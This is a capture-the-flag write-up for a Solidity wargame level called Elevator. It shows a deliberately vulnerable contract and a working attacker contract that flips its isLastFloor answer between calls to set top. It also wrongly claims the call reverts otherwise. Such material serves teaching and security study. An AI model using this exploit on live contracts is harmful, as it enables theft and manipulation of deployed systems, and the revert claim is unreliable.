# **Level 11 -- Elevator**
## **Contract to hack**
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
`````` 
---
## ***Objectives***
* Go to floor
---
## ***Thought Process***
In the `goTo` function, `Building building = Building(msg.sender)` means the contract using interface to call other contract function. Therefore we can create a `building` contract by our own. 

In order to satisfy the `! building.isLastFloor(_floor)` condition, the return value should equal to `false`. However in ` top = building.isLastFloor(floor);` the return value should equal to `true` or the fucntion called would be reverted with error.

As a result, in our `Building` contract, we should make the return value changed when we called the `goTo()` function.

---
## ***Solution***
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    address public levelInstance;
    bool public isFloor = true;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function isLastFloor(uint256) external returns (bool) {
        isFloor = !isFloor;
        return isFloor;
    }

    function go(uint256 floor) public {
        IElevator(levelInstance).goTo(floor);
    }

}

```



